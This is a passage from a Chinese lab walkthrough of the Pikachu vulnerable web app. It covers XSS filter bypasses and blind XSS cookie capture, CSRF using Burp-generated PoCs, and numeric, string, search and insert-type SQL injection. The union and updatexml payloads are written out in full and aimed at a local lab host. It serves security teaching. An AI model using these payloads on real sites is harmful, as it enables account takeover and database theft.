+<p><img src="https://img-blog.csdnimg.cn/img_convert/34c3528d22521e6878f8081387f99491.png"></p>
+<p>提交之后我们再去以管理员身份去访问下用户反馈的意见列表</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d51088fc51fc39503538fdd9087f832c.png"></p>
+<p>查看此处的前端代码，可以看到 xss 盲打平台的 js 文件已经被加载了</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/c484532841f32b47713156b213a12ed8.png"></p>
+<p>现在我们可以回到 xss 盲打平台查看接收到的信息，可以看到已经获取到了后台的 URL 和用户的 Cookie 等信息，此时攻击者就可以直接替换 Cookie 信息去访问管理后台了，这就是完整的 xss 盲打的利用流程</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/769ac2e1bde5db2af84a2bb372b6407a.png"></p>
+<h3 id="xss-之过滤"><a href="#xss-之过滤" class="headerlink" title="xss 之过滤"></a>xss 之过滤</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/14aedb90c5de48cd06e25361bfb8fa48.png"></p>
+<p>本关已经明确有过滤存在了，现在我来直接来黑盒测试下它的过滤规则是怎样的</p>
+<p>首先输入<code>&lt;&gt;</code>发现可以正常打印出来，没有被过滤</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/660854c8b4e1dd96b4b9541484f5e808.png"></p>
+<p>然后输入<code>&lt;script&gt;</code>再次提交，发现只剩下了右括号，其余内容都被过滤掉了</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/ad825a41fe1aaa1a8549f23c79c2255c.png"></p>
+<p>判断对<code>&lt;script</code>进行匹配如果发现存在则直接变为空</p>
+<p>此时我们可以尝试使用双写关键词的方式进行绕过<code>&lt;scrscriptipt&gt;</code>发现无法绕过</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d16a041fc2969eedd025581ff0e86512.png"></p>
+<p>再尝试使用关键词大小写的方式进行绕过<code>&lt;ScRiPt&gt;</code>，发现插入成功，也就是绕过了它的过滤机制</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/983503e04f8bfa473f66caa11e66dd39.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/e8851e32aa607bd79668b8735d0e0d0b.png"></p>
+<p>接下来就编写 xss payload <code>&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</code>，提交之后即可触发</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/717c1ffed6859c1dfd8fae341c53d7aa.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/e2b904d717fcbc4845aba01af84c60a3.png"></p>
+<h3 id="xss-之-htmlspecialchars"><a href="#xss-之-htmlspecialchars" class="headerlink" title="xss 之 htmlspecialchars"></a>xss 之 htmlspecialchars</h3><p>htmlspecialchars() 函数把一些预定义的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%AD%97%E7%AC%A6/4768913?fromModule=lemma_inlink" title="字符">字符</a>转换为 HTML 实体</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">预定义的字符是：</span><br><span class="line">&amp;（和号） 成为&amp;</span><br><span class="line">&quot; （双引号） 成为 &quot;</span><br><span class="line">&#x27; （单引号） 成为 &#x27;</span><br><span class="line">&lt; （小于） 成为 &lt;</span><br><span class="line">&gt; （大于） 成为 &gt;</span><br></pre></td></tr></table></figure>
+
+<p>htmlspecialchars 默认不对<code>&#39;</code>进行处理，所以此处我们的 payload 可以设置为<code>123&#39; onclick=&#39;alert(1)&#39;</code></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/7593655e232b4014f792a8fbd66fab1c.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/c094c7853f31cc0e97466041245a5e80.png"></p>
+<h3 id="xss-之-href-输出"><a href="#xss-之-href-输出" class="headerlink" title="xss 之 href 输出"></a>xss 之 href 输出</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/85c325ff4a04332b9c9ca89d61c71044.png"></p>
+<p>本关可以直接使用<code>javascript:alert(1)</code>进行触发，payload 被加载到 a 标签的 href 属性中，点击即可触发</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/54bfcac9030c93b7eb5ea6a03898af2a.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/2619ecbe9a82ee3790f7bb675b872d22.png"></p>
+<h3 id="xss-之-js-输出"><a href="#xss-之-js-输出" class="headerlink" title="xss 之 js 输出"></a>xss 之 js 输出</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/923a2d61cfd49efbdfaaaa758198009d.png"></p>
+<p>根据提示信息输入 tmac 即可加载出相关球星的照片</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/782694272ea1174218713bcd2860184c.png"></p>
+<p>接下来查看网页源代码，发现是通过 $ms 传递参数，我们可以尝试进行闭合并触发 xss</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/f1d3606b68ca750464454c8660fb85e8.png"></p>
+<p>输入 payload<code>tmac&#39;;alert(1);//</code>即可触发</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/195df1dd271b7ac1c11dc29fd0ef5c7b.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/c177b370c3809545869718b757843c38.png"></p>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>CSRF(跨站请求伪造) 概述</p>
+<p>Cross-site request forgery 简称为 “CSRF”，在 CSRF 的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以 CSRF 攻击也成为 “one click” 攻击。 很多人搞不清楚 CSRF 的概念，甚至有时候会将其和 XSS 混淆, 更有甚者会将其和越权问题混为一谈, 这都是对原理没搞清楚导致的。这里列举一个场景解释一下，希望能够帮助你理解。<strong>场景需求：</strong> 小黑想要修改大白在购物网站 tianxie<a target="_blank" rel="noopener" href="http://www.xx.com/">www.xx.com</a> 上填写的会员地址。<strong>先看下大白是如何修改自己的密码的：</strong> 登录—修改会员信息，提交请求—修改成功。所以小黑想要修改大白的信息，他需要拥有：1，登录权限 2，修改个人信息的请求。</p>
+<p>但是大白又不会把自己 xxx 网站的账号密码告诉小黑，那小黑怎么办？于是他自己跑到 <a target="_blank" rel="noopener" href="http://www.xx.com/">www.xx.com</a> 上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail 地址），他发现修改的请求是：【<a target="_blank" rel="noopener" href="http://www.xxx.com/edit.php?email=xiaohei@88.com&Change=Change%E3%80%91" title="http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change】">http:&#x2F;&#x2F;www.xxx.com&#x2F;edit.php?email&#x3D;xiaohei@88.com&Change=Change】</a>于是，他实施了这样一个操作：把这个链接伪装一下，在小白登录 xxx 网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了, 小黑就完成了攻击目的。</p>
+<p><strong>为啥小黑的操作能够实现呢。有如下几个关键点：</strong> 1.<a href=";---%E5%9B%A0%E6%AD%A4%EF%BC%8C%E6%88%91%E4%BB%AC%E5%88%A4%E6%96%AD%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%EF%BC%8C%E5%85%B6%E5%AE%9E%E5%B0%B1%E6%98%AF%E5%88%A4%E6%96%AD%E5%85%B6%E5%AF%B9%E5%85%B3%E9%94%AE%E4%BF%A1%E6%81%AF%EF%BC%88%E6%AF%94%E5%A6%82%E5%AF%86%E7%A0%81%E7%AD%89%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%EF%BC%89%E7%9A%84%E6%93%8D%E4%BD%9C(%E5%A2%9E%E5%88%A0%E6%94%B9)%E6%98%AF%E5%90%A6%E5%AE%B9%E6%98%93%E8%A2%AB%E4%BC%AA%E9%80%A0%E3%80%822.%E5%B0%8F%E7%99%BD%E7%82%B9%E5%87%BB%E4%BA%86%E5%B0%8F%E9%BB%91%E5%8F%91%E7%BB%99%E7%9A%84%E9%93%BE%E6%8E%A5%EF%BC%8C%E5%B9%B6%E4%B8%94%E8%BF%99%E4%B8%AA%E6%97%B6%E5%80%99%E5%B0%8F%E7%99%BD%E5%88%9A%E5%A5%BD%E7%99%BB%E5%BD%95%E5%9C%A8%E8%B4%AD%E7%89%A9%E7%BD%91%E4%B8%8A;---%E5%A6%82%E6%9E%9C%E5%B0%8F%E7%99%BD%E5%AE%89%E5%85%A8%E6%84%8F%E8%AF%86%E9%AB%98%EF%BC%8C%E4%B8%8D%E7%82%B9%E5%87%BB%E4%B8%8D%E6%98%8E%E9%93%BE%E6%8E%A5%EF%BC%8C%E5%88%99%E6%94%BB%E5%87%BB%E4%B8%8D%E4%BC%9A%E6%88%90%E5%8A%9F%EF%BC%8C%E5%8F%88%E6%88%96%E8%80%85%E5%8D%B3%E4%BD%BF%E5%B0%8F%E7%99%BD%E7%82%B9%E5%87%BB%E4%BA%86%E9%93%BE%E6%8E%A5%EF%BC%8C%E4%BD%86%E5%B0%8F%E7%99%BD%E6%AD%A4%E6%97%B6%E5%B9%B6%E6%B2%A1%E6%9C%89%E7%99%BB%E5%BD%95%E8%B4%AD%E7%89%A9%E7%BD%91%E7%AB%99%EF%BC%8C%E4%B9%9F%E4%B8%8D%E4%BC%9A%E6%88%90%E5%8A%9F%E3%80%82---%E5%9B%A0%E6%AD%A4%EF%BC%8C%E8%A6%81%E6%88%90%E5%8A%9F%E5%AE%9E%E6%96%BD%E4%B8%80%E6%AC%A1CSRF%E6%94%BB%E5%87%BB%EF%BC%8C%E9%9C%80%E8%A6%81%E2%80%9C%E5%A4%A9%E6%97%B6%EF%BC%8C%E5%9C%B0%E5%88%A9%EF%BC%8C%E4%BA%BA%E5%92%8C%E2%80%9D%E7%9A%84%E6%9D%A1%E4%BB%B6%E3%80%82%E5%BD%93%E7%84%B6%EF%BC%8C%E5%A6%82%E6%9E%9C%E5%B0%8F%E9%BB%91%E4%BA%8B%E5%85%88%E5%9C%A8xxx%E7%BD%91%E7%9A%84%E9%A6%96%E9%A1%B5%E5%A6%82%E6%9E%9C%E5%8F%91%E7%8E%B0%E4%BA%86%E4%B8%80%E4%B8%AAXSS%E6%BC%8F%E6%B4%9E%EF%BC%8C%E5%88%99%E5%B0%8F%E9%BB%91%E5%8F%AF%E8%83%BD%E4%BC%9A%E8%BF%99%E6%A0%B7%E5%81%9A%EF%BC%9A">www.xxx.com 这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造;—因此，我们判断一个网站是否存在 CSRF 漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作 (增删改) 是否容易被伪造。2. 小白点击了小黑发给的链接，并且这个时候小白刚好登录在购物网上;—如果小白安全意识高，不点击不明链接，则攻击不会成功，又或者即使小白点击了链接，但小白此时并没有登录购物网站，也不会成功。—因此，要成功实施一次 CSRF 攻击，需要 “天时，地利，人和” 的条件。当然，如果小黑事先在 xxx 网的首页如果发现了一个 XSS 漏洞，则小黑可能会这样做：</a> 欺骗小白访问埋伏了 XSS 脚本（盗取 cookie 的脚本）的页面，小白中招，小黑拿到小白的 cookie，然后小黑顺利登录到小白的后台，小黑自己修改小白的相关信息。—所以跟上面比一下，就可以看出 CSRF 与 XSS 的区别：CSRF 是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而 XSS 是直接盗取到了用户的权限，然后实施破坏。</p>
+<p>因此，网站如果要防止 CSRF 攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致 CSRF。比如：<br>–对敏感信息的操作增加安全的 token；<br>–对敏感信息的操作增加安全的验证码；<br>–对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</p>
+<p>如果你没有读太明白, 不要犹豫, 请再读一遍啦</p>
+<h3 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/2c6dd9e368eec60fb62ace096c70cdf2.png"></p>
+<p>提示：这里一共有这么些用户 vince&#x2F;allen&#x2F;kobe&#x2F;grady&#x2F;kevin&#x2F;lucy&#x2F;lili, 密码全部是 123456</p>
+<p>这里我们使用 vince 登录后，页面显示了用户的个人信息，下方有一个修改个人信息</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/b887fe1a358f2806571d007cb2ced988.png"></p>
+<p>点击之后打开了修改个人信息页面，我们将手机号修改为<code>18888888888</code>，开启 burp 抓包并点击 submit 按钮</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/9dd19ba6682bbd4b4ad011421735190d.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/0284f8b7c6758507cc1e0a5ad62af12e.png"></p>
+<p>此时我们使用 burp 直接生成 CSRF Poc 代码，右键请求包 → Engagement tools → Generate CSRF PoC</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/1058dbcd54dcb7a0442ab5139554718f.png"></p>
+<p>点击 Test in browser</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/373dd1c30d7d5e7c982b68bd9e568b95.png"></p>
+<p>复制弹出的 URL 链接，在浏览器中打开</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/9a851525be98ab1495997411dd77a847.png"></p>
+<p>现在先不要点击 Submit request 按钮</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/59ef15814e4355b82aaa3252fa6e977c.png"></p>
+<p>然后将当前请求包 Drop 掉，关闭 burp 拦截</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/8b27214970c849a8c169dc917720e70f.png"></p>
+<p>重新访问漏洞页面，由于我们刚才 drop 掉了请求包，所以现在的手机号与刚才是相同的没有被修改</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.103/vul/csrf/csrfget/csrf_get_edit.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/ecdfebf2b22592511c2d441897c2e33c.png"></p>
+<p>现在我们去点击 burp 生成的 CSRF Poc 页面中的 submit 按钮</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/01b8e5914edf24541f54827193882d10.png"></p>
+<p>点击之后页面跳转至个人信息页面，并且手机号已经发生了改变，正常情况下这个 CSRF Poc 的页面是攻击者生成的，然后发送给受害者进行点击，然后攻击者就可以使用受害者的合法的身份去访问网站 (比如修改密码、修改个人信息等)。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/68e551416a14f6ff706dfb89117372aa.png"></p>
+<h3 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/758b875d65dab26310c2b922a0596a61.png"></p>
+<p>本关的漏洞利用方式与上一关相同，只是请求方式发生了改变，此处不再赘述</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/92944d66c5163bfae86ab7b53548f9c7.png"></p>
+<h3 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/9506ba47b405dc3e8cb204881e85b5e4.png"></p>
+<p>修改个人信息时发现会携带 token 一起发送，并且会在当前页面的前端代码中生成新的 token 值</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/43db67145a422dcad081f74a62e480e5.png"></p>
+<p>构造一般的 PoC 肯定不行，本关需要使用 burp 的插件 CSRF Token Tracker，在 Extender 里面下载：</p>
+<blockquote>
+<p>CSRF Token Tracker 可以自动获取 csrf 的 token，对于一些有 csrf 限制的请求，它可以绕过该限制，如暴力破解具有 csrf token 的登录请求，在渗透测试过程中 CSRF Token 的自动更新。</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d772b3edce89ad11e6975d0b9c2ee63f.png"></p>
+<p>这里代表 token 的变量名字就叫 token，在插件中添加一条规则：</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/2765369e0b0a7ee805df0cf834581fc5.png"></p>
+<p>将上文的数据包发送到 Repeater，将手机号修改为 13333333333 发送数据包，查看能否修改</p>
+<p>发送请求包后页面出现重定向按钮，我们点击 follow 跟随跳转</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d032fcfb16044128301626e086815bdc.png"></p>
+<p>此时响应包中的手机号已经修改成功了</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/f36604b91b7285dff96e8d4baff7fb59.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/deb699cacac346ea88c160b3af31c63d.png"></p>
+<h2 id="SQL-Inject"><a href="#SQL-Inject" class="headerlink" title="SQL-Inject"></a>SQL-Inject</h2><p>在 owasp 发布的 top10 排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。<strong>一个严重的 SQL 注入漏洞，可能会直接导致一家公司破产！</strong> SQL 注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的 “数据” 拼接到 SQL 语句中后，被当作 SQL 语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。</p>
+<p>在构建代码时，一般会从如下几个方面的策略来防止 SQL 注入漏洞：  </p>
+<ol>
+<li>对传进 SQL 语句里面的变量进行过滤，不允许危险字符传入；  </li>
+<li>使用参数化（Parameterized Query 或 Parameterized Statement）；  </li>
+<li>还有就是, 目前有很多 ORM 框架会自动使用参数化解决注入问题, 但其也提供了 “拼接” 的方式, 所以使用时需要慎重!</li>
+</ol>
+<blockquote>
+<p>本章节不再详细描述 SQL 注入的过程，如果想深入学习 sql 注入漏洞，可以参考 sqli-labs 的那篇文章</p>
+</blockquote>
+<h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><p><strong>抓包分析：</strong> 在这个查询中，”id&#x3D;4 or 1&#x3D;1” 是一个逻辑表达式，用于作为查询条件来筛选 “table1” 表中的记录。<br>逻辑运算符 “or” 表示逻辑或（OR），它表示只要两个条件中的任何一个为真，整个表达式就为真。在这种情况下，”id&#x3D;4” 和 “1&#x3D;1” 是两个条件，其中 “1&#x3D;1” 始终为真，因为它是一个卫语（tautology），表示任何值都等于自己。<br>所以，这个查询会返回 “table1” 表中所有记录，&#x3D;&#x3D;因为 “1&#x3D;1” 作为一个始终为真的条件，将使整个表达式为真，从而不会对 “id&#x3D;4” 这个条件产生实际的筛选作用。&#x3D;&#x3D;这样的查询通常在测试或调试时使用，但在生产环境中，应该使用具有实际业务意义的条件来过滤数据，以满足实际需求。<br><img src="/images/Pasted%20image%2020230410184431.png"><br>全部都select出来，id&#x3D;4因为1&#x3D;1失效。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/7518992ffda9ce2533cb4ad86ded32ed.png"></p>
+<p>使用 burp 开启抓包，选择 1 点击查询按钮，响应包中出现了 mysql 报错信息</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/1bdde886cef47fa2787a32a5b94b16e8.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6e0f98188fbc75fcda33544810ebd1fe.png"></p>
+<p>直接使用报错注入的 payload 即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">id=1 正常显示</span><br><span class="line">id=1&#x27; 提示mysql报错</span><br><span class="line">id=1 and 1=1 页面显示正常</span><br><span class="line">id=1 and 1=2 页面显示错误</span><br><span class="line">判断为mysql数据库的数字型注入点</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用以下payload获取数据库名称：</span><br><span class="line">1+and+updatexml(1,concat(0x7e,(select+database()),0x7e),1)+--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/355f0c94cea6ec1993c2763846fde064.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/5bd9b10b3e90491f2aa64202ee10a314.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/b96cfc18aba23c867d48f00626ad7c84.png"></p>
+<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>这是一种可能用于尝试进行 SQL 注入的语句。在这个语句中，通过在查询条件中添加 <code>&#39; or 1=1 #</code>，试图让查询条件永远为真，从而绕过原本的身份验证或查询限制，获取更多的数据。<br>具体解释如下：</p>
+<ul>
+<li><code>&#39;</code> 是 SQL 中的字符串引号，用于表示字符串值的开始或结束。</li>
+<li><code>or</code> 是 SQL 中的逻辑运算符，表示逻辑或关系，只要其中一个条件为真，整个条件就为真。</li>
+<li><code>1=1</code> 是一个始终为真的条件，因为 1 等于 1。</li>
+<li><code>#</code> &#x3D;&#x3D;是 SQL 中的注释符号，表示后面的内容为注释，不会被执行。&#x3D;&#x3D;</li>
+<li>整个语句的作用是尝试在查询条件中添加一个始终为真的条件，使得整个查询条件永远为真，从而绕过原本的查询限制。<br><img src="/images/Pasted%20image%2020230410191057.png"></li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/e29f434845ef2905f70ffcf5746bf9a3.png"></p>
+<p>本关也是同样的 首先判断是字符型还是数字型，然后获取数据库名称</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">name=123 页面显示正常</span><br><span class="line">name=123&#x27; mysql报错提示</span><br><span class="line">name=123&#x27;&#x27; 页面显示正常，判断为字符型注入</span><br><span class="line">name=123&#x27; order by 3 --+ 判断查询字段有2列</span><br><span class="line">name=123&#x27; union select 1,2 --+ 页面显示结果uid为1，email为2</span><br><span class="line">name=123&#x27; union select database(),version() --+ 使用union联合注入获取数据库名和数据库版本信息</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6439ac56f7ba1a31c27368818ad51692.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6b340563a9a6e351d37fe3cba81eff46.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d98a6e38960f4a35b43696b5c9b6ca24.png"></p>
+<p>页面显示结果 uid 为 1，email 为 2</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/fcefcdffcf6d495514856ef6b2b8a6a9.png"></p>
+<p>使用 union 联合注入获取数据库名和数据库版本信息</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/5dab04c05dc1d12312a2559b04401336.png"></p>
+<h3 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h3><p>闭合符号为<code>%&#39;</code>, 注入 payload: <code>g%&#39; union select database(),2,3#</code>  </p>
+<ol>
+<li>“SELECT * FROM 表名”：这是一个普通的 SQL 查询语句，用于从名为 “表名” 的表中选择所有的列和记录。</li>
+<li>“WHERE g%’”：这是一个 SQL 注入的攻击向量，其中通过在查询条件中使用 ‘ 符号来尝试绕过数据库的输入验证。在这里，g% 是一个用于构造恶意注入查询的字符串，’ 符号的作用是闭合 SQL 查询语句中的字符串，从而导致后续的注入语句变成合法的 SQL 语句。</li>
+<li>“UNION SELECT database(),2,3 #”：这是注入语句的一部分，使用 UNION SELECT 关键字进行注入。在这里，database() 是 MySQL 数据库的一个内置函数，用于获取当前数据库的名称，2 和 3 是两个固定的数字，表示一个具有三列的结果集。</li>
+<li>“#”：这是一个 SQL 注释符号，用于注释掉查询语句的剩余部分，从而避免引起错误。<br>综合来说，这段 SQL 查询语句的目的是通过 SQL 注入攻击来尝试获取当前数据库的名称，并构造一个带有三列的结果集，其中第一列是当前数据库的名称，第二和第三列是固定的数字 2 和 3。<br><img src="https://img-blog.csdnimg.cn/img_convert/650a475c31608a70b3a5f527bacb60f3.png"><br>注入 payload: <code>g%&#39; union select database(),version(),current_user() #</code><img src="/images/Pasted%20image%2020230410193922.png"><br>注入<code>&#39; or 1=1 #</code><br><img src="/images/Pasted%20image%2020230410193151.png"><br>xx 型注入<br><img src="https://img-blog.csdnimg.cn/img_convert/aa538ffb180bfef70c62e13f518897cf.png"></li>
+</ol>
+<p>加入单引号后出现了报错，并且根据报错信息我们推断此处代码闭合方式为 %username%</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/3e2038d70e3908c7f44047bfbccb7bda.png"></p>
+<p>所以此处我们需要在单引号前加入 % 来闭合 (此处闭不闭合 % 其实都能注入成功)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">123&#x27; 页面报错</span><br><span class="line">123%&#x27;&#x27; 页面不报错</span><br><span class="line">123%&#x27; order by 4 --+ 页面提示没有4列，所以此处查询的sql有3列</span><br><span class="line">123%&#x27; union select 1,2,3 --+ 判断显示位，此处3列都能显示</span><br><span class="line">123%&#x27; union select database(),version(),user() --+ 获取当前数据库名称、版本信息、用户信息</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/9d427b1c6984a0b98398161ebbe0b8d6.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/823fb4776e1a7b774016206f4e2e3aa4.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/118d9b15ca2f9dffa4c2b1ae9f01ab13.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">123&#x27; 提示mysql报错信息</span><br><span class="line">123&#x27; order by 1 --+ 还是报错，根据报错信息判断123后面应该有个右括号需要闭合一下</span><br><span class="line">123&#x27;) order by 3 --+ 执行成功，判断查询的内容有2列</span><br><span class="line">123&#x27;) union select database(),version() --+ 使用union联合查询获取数据库名称和版本信息</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/f8246e5328b15c9d2a2aee6d26b29acc.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/3baf80cdc45bf532b030b36aa1cce729.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/de1839e0ef01c25498960255b88bbe0d.png"></p>
+<h3 id="insert-x2F-update-注入"><a href="#insert-x2F-update-注入" class="headerlink" title="insert&#x2F;update 注入"></a>insert&#x2F;update 注入</h3><blockquote>
+<p>注意：<strong>此类型注入在实际测试中尽量不要使用，操作不当可能会导致数据库插入大量脏数据！！！</strong></p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/3f02955796ff59f7c93ebb4a5b731bb1.png"></p>
+<p>首先在注册功能点输入任意内容，并在最后一个参数后面加入单引号，发现出现了 sql 语句报错，注意 这种 insert&#x2F;update 类型的 sql 在进行注入时尽量在最后一个参数插入 payload 进行注入，这样可以更容易闭合 sql 语句完成注入，像本关的这个 insert 语句我们直接就在<code>住址(Add)</code>这个参数进行注入，闭合前面的 sql 只需要加入<code>&#39;$payload)</code>(前后分别加入单引号和右括号)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本关的SQL语句：</span><br><span class="line">insert into member(username,pw,sex,phonenum,email,address) values(&#x27;&#123;$getdata[&#x27;username&#x27;]&#125;&#x27;,md5(&#x27;&#123;$getdata[&#x27;password&#x27;]&#125;&#x27;),&#x27;&#123;$getdata[&#x27;sex&#x27;]&#125;&#x27;,&#x27;&#123;$getdata[&#x27;phonenum&#x27;]&#125;&#x27;,&#x27;&#123;$getdata[&#x27;email&#x27;]&#125;&#x27;,&#x27;&#123;$getdata[&#x27;add&#x27;]&#125;&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/df127fc8640c34602b817b29decbeb94.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/8a28735ab7ffb7cb73b622ba2816a8de.png"></p>
+<p>接下来获取数据库信息，使用以下 payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+and+updatexml(1,concat(0x7e,(select+database()),0x7e),1))+--+</span><br></pre></td></tr></table></figure>
+
+<p><code>+</code> 用于 URL 编码空格，<code>--</code> 表示注释掉后续的 SQL 查询。<br><img src="/images/Pasted%20image%2020230411121516.png"><br><img src="https://img-blog.csdnimg.cn/img_convert/3caf088a81dd7a58eb8ff6f673b4a31b.png"></p>
+<p>获取数据库版本信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+and+updatexml(1,concat(0x7e,(select+version()),0x7e),1))+--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Pasted%20image%2020230411141503.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/1c100f4edcaeaf9e4e65822017059f56.png"></p>
+<p>然后尝试使用刚注册的 123 账号进行登录，可以登录成功</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/e3a0886a16389775862cf10001081702.png"></p>
